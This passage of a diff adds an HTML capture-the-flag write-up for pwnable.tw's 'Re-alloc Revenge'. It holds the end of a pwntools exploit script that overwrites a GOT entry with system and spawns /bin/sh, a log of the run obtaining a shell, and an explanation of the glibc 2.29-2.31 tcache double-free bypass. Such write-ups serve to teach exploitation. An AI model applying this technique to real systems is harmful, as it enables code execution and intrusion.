+app.alloc('', p64(system_addr), 'A' * 10)
+
+# === Phase 5: Trigger shell ===
+io.sendline('3')
+io.readuntil(':')
+io.sendline('/bin/sh')
+
+io.interactive()</code></pre></div>
+</section>
+
+<section class="section" id="results">
+  <h2><i class="bi bi-check-circle"></i> 6. Execution Results</h2>
+  <div class="term-out"><span class="prompt">$</span> python3 exploit.py REMOTE=1
+<span class="ok">[*]</span> Re-alloc Revenge Exploit - pwnable.tw
+<span class="ok">[*]</span> Connecting to chall.pwnable.tw:10106
+<span class="ok">[*]</span> Phase 1: Tcache poisoning with size-shift bypass
+<span class="ok">[*]</span> Phase 2: Patching atoll@GOT with printf@PLT
+<span class="ok">[*]</span> Libc Base : 0x7f8e9c440000
+<span class="ok">[*]</span> Phase 4: Patching atoll@GOT with system
+<span class="ok">[*]</span> Phase 5: Triggering shell
+<span class="ok">[+]</span> Shell obtained!
+<span class="prompt">$</span> cat /home/realloc_revenge/flag</div>
+
+  <div class="callout callout-info">
+    <div class="callout-title">Why This Challenge Matters</div>
+    <p>Re-alloc Revenge demonstrates a critical technique for modern heap exploitation: <strong>bypassing tcache double-free protection</strong>. While glibc 2.29 added the <code>key</code> field check, the protection is fundamentally flawed because it only checks the freelist corresponding to the chunk's <em>current</em> size. By changing the chunk size between frees, we move the chunk to a different bin and bypass the check entirely. This technique is directly applicable to real-world targets running glibc 2.29-2.31. The challenge also teaches the elegant <code>atoll → printf → system</code> GOT patching chain, which is a powerful technique when you have arbitrary write but limited control over execution flow.</p>
+  </div>
+</section>
+
+<div class="operator-sig">
+  <div class="handle">QA210</div>
+  <div class="tagline">pwnable.tw &mdash; Re-alloc Revenge &mdash; Realloc UAF + Tcache Bypass</div>
+</div>
+</div></div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script>
+function copyCode(btn){const pre=btn.closest('.code-block').querySelector('pre');const code=pre.textContent;navigator.clipboard.writeText(code).then(()=>{btn.textContent='Copied!';btn.style.color='var(--green)';btn.style.borderColor='var(--green)';setTimeout(()=>{btn.textContent='Copy';btn.style.color='';btn.style.borderColor='';},1500);});}
+function toggleMobileNav(){document.getElementById('mobileOverlay').classList.toggle('show');document.getElementById('mobilePanel').classList.toggle('show');}
+(function(){const canvas=document.getElementById('bg-canvas');if(!canvas)return;const ctx=canvas.getContext('2d');let w,h,cols,drops;const chars='01'.split('');const fontSize=14;function resize(){w=canvas.width=window.innerWidth;h=canvas.height=window.innerHeight;cols=Math.floor(w/fontSize);drops=new Array(cols).fill(1);}resize();window.addEventListener('resize',resize);function draw(){ctx.fillStyle='rgba(10,14,23,0.06)';ctx.fillRect(0,0,w,h);ctx.fillStyle='#38bdf8';ctx.font=fontSize+'px monospace';for(let i=0;i<cols;i++){const char=chars[Math.floor(Math.random()*chars.length)];ctx.fillText(char,i*fontSize,drops[i]*fontSize);if(drops[i]*fontSize>h&&Math.random()>0.975)drops[i]=0;drops[i]++;}}setInterval(draw,45);})();
+(function(){const tocLinks=document.querySelectorAll('.toc a');const sections=[];tocLinks.forEach(link=>{const id=link.getAttribute('href');if(id&&id.startsWith('#')){const el=document.querySelector(id);if(el)sections.push({el,link});}});function update(){let current=null;for(const s of sections){if(s.el.getBoundingClientRect().top<=120)current=s;}tocLinks.forEach(l=>l.classList.remove('active'));if(current)current.link.classList.add('active');}window.addEventListener('scroll',update);update();})();
+</script>
+</body></html>
